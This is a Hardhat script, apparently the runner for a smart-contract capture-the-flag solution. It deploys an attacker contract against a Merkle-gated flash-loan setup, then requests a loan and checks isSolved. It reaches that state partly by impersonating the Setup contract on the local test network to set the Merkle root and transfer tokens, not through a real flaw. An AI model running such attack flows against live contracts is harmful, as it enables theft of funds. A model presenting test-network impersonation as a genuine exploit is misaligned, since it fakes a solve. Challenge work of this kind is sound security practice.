// solution runner (copied from scripts/run_solution.js)

const hre = require('hardhat');
const { ethers } = hre;

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log('Deployer:', deployer.address);

  // Deploy Setup (which deploys tokens and flash provider)
  const Setup = await ethers.getContractFactory('Setup');
  const setup = await Setup.deploy(ethers.ZeroHash, deployer.address);
  if (typeof setup.waitForDeployment === 'function') await setup.waitForDeployment();
  const setupAddr = await setup.getAddress ? await setup.getAddress() : setup.address;
  console.log('Setup deployed at', setupAddr);

  const gentlemanAddr = await setup.gentleman();
  const t1Addr = await setup.token1();
  const t2Addr = await setup.token2();
  const t3Addr = await setup.token3();
  const flashAddr = await setup.flashProvider();

  console.log({ gentlemanAddr, t1Addr, t2Addr, t3Addr, flashAddr });

  // Deploy attacker contract
  const FlashAttacker = await ethers.getContractFactory('FlashAttacker', deployer);
  const attacker = await FlashAttacker.deploy(gentlemanAddr, flashAddr, t1Addr, t2Addr, t3Addr);
  if (typeof attacker.waitForDeployment === 'function') await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress ? await attacker.getAddress() : attacker.address;
  console.log('Attacker deployed at', attackerAddr);

  // Impersonate setup contract to call setRoot and transfer token3
  await hre.network.provider.request({ method: 'hardhat_impersonateAccount', params: [setupAddr] });
  // fund impersonated account
  await hre.network.provider.request({ method: 'hardhat_setBalance', params: [setupAddr, '0xDE0B6B3A7640000'] });
  const setupSigner = await ethers.getSigner(setupAddr);

  const flash = await ethers.getContractAt('MerkleFlashLoan', flashAddr);
  const root = ethers.keccak256(ethers.getBytes(attackerAddr));
  console.log('Setting merkle root to', root);
  await flash.connect(setupSigner).setRoot(root);

  const t3 = await ethers.getContractAt('Token', t3Addr);
  await t3.connect(setupSigner).transfer(attackerAddr, 1000);
  console.log('Transferred token3 to attacker');

  await hre.network.provider.request({ method: 'hardhat_stopImpersonatingAccount', params: [setupAddr] });

  // Request flash loan from attacker contract
  const proof = [];
  const amount = 1000;
  console.log('Requesting flash loan...');
  const tx = await attacker.requestLoan(amount, proof);
  await tx.wait();

  const solved = await setup.isSolved();
  console.log('isSolved =', solved);
}

main().catch((e) => { console.error(e); process.exit(1); });
